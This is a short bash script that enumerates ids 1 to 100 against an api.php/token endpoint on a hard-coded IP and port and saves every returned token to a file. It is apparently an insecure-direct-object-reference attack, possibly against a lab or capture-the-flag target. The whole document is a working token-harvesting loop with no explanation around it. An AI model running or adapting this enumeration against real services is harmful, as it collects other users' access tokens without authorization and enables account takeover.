#!/bin/bash
for i in {1..100}; do
curl -s http://94.237.54.42:41031/api.php/token/$i >> tokens.txt
echo >> tokens.txt
done
